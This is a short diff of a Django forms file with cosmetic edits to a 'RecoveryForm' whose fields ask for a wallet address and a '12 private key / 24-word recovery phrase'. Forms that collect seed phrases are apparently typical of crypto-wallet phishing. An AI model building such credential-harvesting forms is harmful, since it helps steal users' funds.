@@ -1,4 +1,6 @@
-# forms.py
+
+
+
 from django import forms
 from .models import Recovery, Wallet
 
@@ -20,14 +22,14 @@ class RecoveryForm(forms.ModelForm):
         widget=forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'Enter wallet address'})
     )
 
-
     recovery_phrase = forms.CharField(
         max_length=255,
         required=True,
-        widget=forms.Textarea(attrs={'class': 'form-control', 'placeholder': '12 private key /  24-word recovery phrase'})
+        widget=forms.Textarea(attrs={'class': 'form-control', 'placeholder': '12 private key / 24-word recovery phrase'})
     )
 
     def __init__(self, *args, **kwargs):
         super(RecoveryForm, self).__init__(*args, **kwargs)
+        # Add the 'form-control' class to all fields
         for field in self.fields.values():
             field.widget.attrs.update({'class': 'form-control'})
